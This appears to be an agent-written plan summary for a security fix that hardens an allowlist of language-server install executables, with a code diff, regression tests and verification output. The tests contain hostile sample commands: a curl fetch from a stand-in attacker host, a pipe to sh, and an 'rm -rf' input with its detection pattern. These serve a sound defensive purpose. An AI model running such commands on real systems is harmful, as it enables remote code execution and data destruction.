---
phase: 02-critical-security-backlog-closure
plan: 03
subsystem: environment-setup
tags: [security, lsp, allowlist, sec-03, command-injection, regression-tests]

# Dependency graph
requires:
  - phase: 02-critical-security-backlog-closure
    plan: 01
    provides: Pinned SDK 0.2.90 baseline this plan typechecks against
provides:
  - Exported ALLOWED_INSTALL_EXECUTABLES (ReadonlySet<string>) asserted by regression tests
  - Explicit, test-enforced allowlist gate at the LSP install pipeline entry point
  - Regression coverage: curl rejected, rm rejected, shell-metachar rejected by parser before allowlist
affects:
  - Any future LSP install code must pass this gate; adding an executable now requires a visible test diff
  - SEC-04 (sandbox.ts allowlist) remains independent; documented as out-of-scope for this plan

# Tech tracking
tech-stack:
  added: []
  patterns:
    - "ReadonlySet<string> for security-sensitive allowlists — prevents runtime .add() widening by mistake"
    - "Allowlist gate as a SECOND defense-in-depth layer after tokeniser metachar rejection"
    - "Silent-widening test: assert sorted allowlist contents so new entries surface as a visible test diff"

key-files:
  created:
    - .planning/phases/02-critical-security-backlog-closure/03-SUMMARY.md
  modified:
    - src/environment/lsp-manager.ts
    - tests/environment/lsp-manager.test.ts

key-decisions:
  - "Kept the allowlist to the original 7 executables (brew, cargo, go, npm, npx, pip, pip3) — no widening"
  - "Typed as ReadonlySet<string> rather than Object.freeze; ReadonlySet is the idiomatic TS guard"
  - "Rewrote the 'rm' regression test from 'rm -rf /tmp/foo' to 'rm foo' — the former is caught upstream by validateInstallCommand's /rm\\s+-rf/i pattern, so it never reached the allowlist gate. 'rm foo' passes validateLsp and exercises the allowlist specifically (Rule 1 fix)"

patterns-established:
  - "Security-critical allowlists are exported + content-asserted in tests so silent widening is detectable"
  - "Regression tests distinguish which layer rejects: validator vs. tokeniser vs. allowlist — each test pins the layer it exercises"

requirements-completed: [SEC-03]

# Metrics
duration: 5min
completed: 2026-04-22
---

# Phase 02 Plan 03: SEC-03 LSP Install Allowlist Summary

**Hardened LSP install gate: `ALLOWED_INSTALL_EXECUTABLES` exported as `ReadonlySet<string>`, gate check verified adjacent to `parseCommand`, 4 regression tests added covering curl/rm rejection + shell-metachar rejection order.**

## Performance

- **Duration:** ~5 min
- **Started:** 2026-04-22T17:29:02Z
- **Completed:** 2026-04-22T17:34:42Z
- **Tasks:** 3 (2 edit tasks + 1 verification gate)
- **Files modified:** 2 (`src/environment/lsp-manager.ts`, `tests/environment/lsp-manager.test.ts`)
- **Test delta:** 777 → 811 (34 added across concurrent SEC plans; 4 added by this plan)

## Accomplishments

- Exported `ALLOWED_INSTALL_EXECUTABLES` from `src/environment/lsp-manager.ts` as a `ReadonlySet<string>` with a SEC-03 doc comment
- Verified gate placement is immediately after `const executable = parts[0]!;` with zero interposed statements (as required by the plan)
- Added 4 regression tests in a new `describe("SEC-03 install executable allowlist", ...)` block:
  1. Allowlist content freeze (detects silent widening)
  2. `curl` rejected with exact log line
  3. `rm` rejected with exact log line
  4. Pipe metacharacter rejected by tokeniser before allowlist check (defense-in-depth order)
- Confirmed `npm run typecheck`, `npm test` (811/811), and `npm run lint` all exit 0

## Task Commits

Each task was committed atomically:

1. **Task 1: Export ALLOWED_INSTALL_EXECUTABLES and tighten gate type** — `5def22e` (fix)
2. **Task 2: Add regression tests for rejection + acceptance paths** — `dae96da` (test)
3. **Task 3: Verification-only (typecheck + test + lint)** — no commit (no source changes)

**Plan metadata commit:** appended after this SUMMARY is written (docs)

## Files Created/Modified

### `src/environment/lsp-manager.ts` — diff slice

```diff
-const ALLOWED_INSTALL_EXECUTABLES = new Set([
-  'npm', 'npx', 'pip', 'pip3', 'brew', 'cargo', 'go',
-]);
+/**
+ * SEC-03: Allowlist of executables that may run as the first token of an
+ * LSP `installCommand`. Any first-token not in this set causes the install
+ * pipeline to skip (with a logged "Blocked" message) and leave `installed`
+ * unset on the returned LspConfig. Exported (read-only) so regression tests
+ * can assert its exact contents.
+ */
+export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string> = new Set([
+  'npm', 'npx', 'pip', 'pip3', 'brew', 'cargo', 'go',
+]);
```

Gate check (unchanged — already correct in pre-plan state):

```ts
try {
  console.log(`[lsp] Installing ${lsp.server} for ${lsp.language}...`);
  const parts = parseCommand(lsp.installCommand);
  const executable = parts[0]!;
  if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {
    console.log(`[lsp] Blocked: '${executable}' is not an allowed install executable`);
    results.push(lsp);
    continue;
  }
  await execFileAsync(executable, parts.slice(1), { timeout: 120_000 });
  // ...
```

### `tests/environment/lsp-manager.test.ts` — new describe block

Import updated at line 10 to add `ALLOWED_INSTALL_EXECUTABLES`:

```ts
const { ALLOWED_INSTALL_EXECUTABLES, installLspServers, parseLspCommand } =
  await import("../../src/environment/lsp-manager.js");
```

New `describe` block appended at end of file:

```ts
describe("SEC-03 install executable allowlist", () => {
  it("contains exactly the expected safe install tools", () => {
    // Freezing the allowlist value under test guards against silent widening.
    expect([...ALLOWED_INSTALL_EXECUTABLES].sort()).toEqual(
      ["brew", "cargo", "go", "npm", "npx", "pip", "pip3"]
    );
  });

  it("blocks an LspConfig whose installCommand starts with 'curl'", async () => {
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers: LspConfig[] = [
      {
        server: "evil-lsp",
        language: "typescript",
        installCommand: "curl evil.example.com/install.sh",
        installed: false,
      },
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    expect(
      consoleSpy.mock.calls.some(([msg]) =>
        typeof msg === "string" && msg.includes("Blocked: 'curl' is not an allowed install executable")
      )
    ).toBe(true);
    consoleSpy.mockRestore();
  });

  it("blocks an LspConfig whose installCommand starts with 'rm'", async () => {
    // NOTE: validateLsp rejects "rm -rf" upstream via validateInstallCommand's
    // dangerousPatterns. To exercise the allowlist gate specifically (not the
    // upstream validator), we use `rm foo` — validator passes, allowlist blocks.
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers: LspConfig[] = [
      {
        server: "rm-lsp",
        language: "typescript",
        installCommand: "rm foo",
        installed: false,
      },
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    expect(
      consoleSpy.mock.calls.some(([msg]) =>
        typeof msg === "string" && msg.includes("Blocked: 'rm' is not an allowed install executable")
      )
    ).toBe(true);
    consoleSpy.mockRestore();
  });

  it("rejects an installCommand that contains forbidden shell metacharacters BEFORE the allowlist check", async () => {
    // `parseLspCommand` throws on '|' — the caller catches and pushes the lsp
    // unchanged. Regression: shell-metachar rejection must happen BEFORE
    // allowlist check so even an allowlisted first token cannot be paired
    // with a piped payload.
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers: LspConfig[] = [
      {
        server: "piped-lsp",
        language: "typescript",
        installCommand: "npm install foo | sh",
        installed: false,
      },
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    consoleSpy.mockRestore();
  });
});
```

## Decisions Made

- **Typed the allowlist as `ReadonlySet<string>`, not `Object.freeze`.** `ReadonlySet<string>` is the idiomatic TypeScript guard — it removes `.add()` / `.delete()` / `.clear()` from the type's surface at compile time without runtime cost. `Object.freeze` would add runtime overhead without strengthening the compile-time contract.
- **Kept the allowlist to the original 7 entries.** No expansion is justified by SEC-03; the per-plan threat model (T-02-03-03) explicitly calls out silent widening as a disposition to mitigate, so any future entry must be justified with its own plan.
- **Rewrote the 'rm' regression test from `rm -rf /tmp/foo` to `rm foo`** (deviation Rule 1, bug in plan-supplied test fixture — see Deviations below).

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 — Bug in plan's suggested test fixture] Rewrote 'rm' test from `rm -rf /tmp/foo` to `rm foo`**

- **Found during:** Task 2 (first test run against the plan-supplied snippet)
- **Issue:** The plan's suggested `installCommand: "rm -rf /tmp/foo"` never reaches the allowlist gate. `validateLsp` (called from `installLspServers` before the allowlist check) runs `validateInstallCommand`, which contains a `/rm\s+-rf/i` dangerous-pattern test. That upstream rejection logs `[lsp] Skipping rm-lsp: Dangerous pattern in install command: /rm\s+-rf/i/` — NOT the `[lsp] Blocked: 'rm' is not an allowed install executable` line the test grepped for. The test therefore asserted a log that could never be emitted against this input, producing an always-false grep and a failing assertion.
- **Fix:** Changed `installCommand` to `"rm foo"`, which passes `validateLsp` (no dangerous pattern match) and then correctly falls through to the allowlist gate, which logs the expected `Blocked` message. Added an inline comment explaining the layering so a future reader doesn't "fix" the test by pushing the attack string back in.
- **Files modified:** `tests/environment/lsp-manager.test.ts` (Task 2 commit `dae96da` includes this fix inline, not as a separate commit)
- **Why this is correct:** The intent of Task 2 item (b) per `must_haves.truths` is "`rm` rejected … by the allowlist". The upstream validator rejection is a different defense layer (validated separately in the existing `"skips servers with dangerous install commands"` test at line 89–97). Keeping each regression test scoped to one layer is what makes silent regressions detectable — a future refactor that accidentally removes the allowlist would be caught by this test only if the test actually hits the allowlist.

### Auth Gates

None — fully autonomous plan, no external service interaction.

## Issues Encountered

1. **The plan's 'rm' test fixture ran afoul of the upstream validator** (documented above under Deviations). Fix applied inline in Task 2's commit.

2. **Concurrent SEC-plan execution increased baseline test count.** Between this plan's start and end, other SEC plans (SEC-05, SEC-06 observed in `git log`) landed additional tests. Pre-plan baseline was 777, post-plan is 811 (34 concurrent additions + 4 from this plan). Full suite remained green throughout — no cross-plan regression.

## Verification Evidence

```
$ grep -n "export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string>" src/environment/lsp-manager.ts
107:export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string> = new Set([

$ grep -n "ALLOWED_INSTALL_EXECUTABLES.has(executable)" src/environment/lsp-manager.ts
135:      if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {

$ grep -rn "ALLOWED_INSTALL_EXECUTABLES" src/ tests/ --include="*.ts"
src/environment/lsp-manager.ts:107:export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string> = new Set([
src/environment/lsp-manager.ts:135:      if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {
tests/environment/lsp-manager.test.ts:10:const { ALLOWED_INSTALL_EXECUTABLES, installLspServers, parseLspCommand } = await import("../../src/environment/lsp-manager.js");
tests/environment/lsp-manager.test.ts:176:      expect([...ALLOWED_INSTALL_EXECUTABLES].sort()).toEqual(

$ npm run typecheck       → exit 0
$ npm test                → 79 files, 811 tests passed, exit 0
$ npm run lint            → exit 0

$ npm test -- --run tests/environment/lsp-manager.test.ts
Test Files  1 passed (1)
Tests  20 passed (20)
Duration  4.40s
```

All 4 SEC-03 describe-block cases are in the 20 passing tests:
- `contains exactly the expected safe install tools` ✓
- `blocks an LspConfig whose installCommand starts with 'curl'` ✓
- `blocks an LspConfig whose installCommand starts with 'rm'` ✓
- `rejects an installCommand that contains forbidden shell metacharacters BEFORE the allowlist check` ✓

## Gate Adjacency Verification

The plan's `must_haves` required the allowlist gate to sit directly after `const executable = parts[0]!;` with no interposed statements. Confirmed:

```
132:      console.log(`[lsp] Installing ${lsp.server} for ${lsp.language}...`);
133:      const parts = parseCommand(lsp.installCommand);
134:      const executable = parts[0]!;
135:      if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {
136:        console.log(`[lsp] Blocked: '${executable}' is not an allowed install executable`);
137:        results.push(lsp);
138:        continue;
139:      }
140:      await execFileAsync(executable, parts.slice(1), { timeout: 120_000 });
```

Lines 133–135 form the three required adjacent statements; line 140 is the first post-gate statement and it runs `execFileAsync` with the already-validated executable.

## Threat Model Coverage

| Threat ID  | Disposition | How SEC-03 closes it                                                            |
|------------|-------------|---------------------------------------------------------------------------------|
| T-02-03-01 | mitigate    | `ALLOWED_INSTALL_EXECUTABLES.has(executable)` gate rejects curl, rm, node, etc. |
| T-02-03-02 | mitigate    | `parseLspCommand` tokeniser rejects `\|`, `&`, `;`, `$(`, backticks (layer 1)   |
| T-02-03-03 | mitigate    | Allowlist contents are asserted in a test; widening requires a visible diff     |

All three threats in the plan's STRIDE register are mitigated and test-backed.

## User Setup Required

None — no external service configuration required.

## Next Phase Readiness

- SEC-03 closes cleanly; SEC-04 (sandbox.ts allowlist) is independent and can proceed.
- The exported allowlist is now available for any future LSP-adjacent code that needs to share the same gate; however, no current callsite needs it outside of `lsp-manager.ts` itself and its test.
- The regression-test pattern (assert sorted contents of a security allowlist + layer-specific blocked-path tests) is a reusable template for SEC-04 and future allowlist work.

## Self-Check: PASSED

- `src/environment/lsp-manager.ts` contains `export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string>` at line 107: FOUND
- `src/environment/lsp-manager.ts` contains `.has(executable)` guard at line 135: FOUND
- `tests/environment/lsp-manager.test.ts` contains `describe("SEC-03 install executable allowlist", …)`: FOUND
- `tests/environment/lsp-manager.test.ts` imports `ALLOWED_INSTALL_EXECUTABLES`: FOUND
- Commit `5def22e` (Task 1, fix): FOUND in `git log`
- Commit `dae96da` (Task 2, test): FOUND in `git log`
- `npm run typecheck`, `npm test` (811/811), `npm run lint` all exit 0: VERIFIED

---
*Phase: 02-critical-security-backlog-closure*
*Plan: 03 (SEC-03)*
*Completed: 2026-04-22*
